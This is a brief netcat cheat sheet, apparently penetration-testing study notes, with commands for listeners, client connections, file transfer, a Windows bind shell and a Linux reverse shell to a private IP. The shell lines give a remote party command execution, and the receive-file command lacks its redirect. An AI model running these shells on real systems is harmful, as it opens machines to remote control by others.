## server start listener for communication on port 4444
nc -nlvp 4444

## client start communication with server at port 4444
nc -nv 10.11.11.125 4444

## Recieve a file using nc
nc -nlvp 4445 file.file

## Send a file using nc
nc -nv 10.11.11.125 4445 </usr/share/windows-binaries/file.exe

## Bind Shell on windows --executed on the computer to be controlled
nc -nlvp 4445 -e cmd.exe

## Reverse Shell on Linux
nc -nv 10.11.11.125 4445 -e /bin/bash
